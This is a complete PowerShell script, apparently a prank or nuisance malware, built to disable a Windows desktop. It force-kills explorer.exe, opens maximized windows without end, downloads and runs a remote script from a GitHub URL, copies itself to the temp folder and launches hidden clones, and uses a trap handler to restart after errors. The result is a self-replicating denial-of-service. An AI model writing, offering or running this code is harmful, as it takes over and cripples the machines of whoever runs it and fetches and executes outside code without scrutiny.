Get-Process -Name "explorer" -ErrorAction SilentlyContinue | Stop-Process -Force

function New-MatrixWindow {
    param($windowId)
    
    $matrixUrl = "https://raw.githubusercontent.com/mathieures/Posh-Matrix/refs/heads/main/Start-Matrix.ps1"
    
    try {
        $matrixScript = Invoke-RestMethod -Uri $matrixUrl -ErrorAction Stop
        $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
        Set-Content -Path $tempScript -Value $matrixScript
        Start-Process powershell -ArgumentList @(
            "-NoExit",
            "-WindowStyle", "Maximized",
            "-File", "`"$tempScript`""
        )
    }
    catch {
        $fallbackCode = @'
while ($true) {
    $w = $host.UI.RawUI.WindowSize.Width
    $chars = "01abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    
    for ($i = 0; $i -lt $w; $i++) {
        $char = $chars[(Get-Random -Minimum 0 -Maximum $chars.Length)]
        $color = @('Green','DarkGreen','White','Gray') | Get-Random
        Write-Host $char -ForegroundColor $color -NoNewline
    }
    Write-Host ""
    Start-Sleep -Milliseconds 30
}
'@
        $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
        Set-Content -Path $tempScript -Value $fallbackCode
        Start-Process powershell -ArgumentList @(
            "-NoExit",
            "-WindowStyle", "Maximized",
            "-File", "`"$tempScript`""
        )
    }
}

$count = 1
do {
    if ($count % 10 -eq 0) {
        Get-Process -Name "explorer" -ErrorAction SilentlyContinue | Stop-Process -Force
    }
    
    New-MatrixWindow -windowId $count
    $count++
    
    Start-Sleep -Milliseconds 50
    
    if ($count % 20 -eq 0) {
        $clonePath = "$env:TEMP\matrix_clone_$(Get-Random).ps1"
        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $clonePath
        Start-Process powershell -ArgumentList @("-WindowStyle", "Hidden", "-File", "`"$clonePath`"")
    }
    
} while ($true)

trap {
    Start-Sleep -Seconds 3
    & $MyInvocation.MyCommand.Path
}
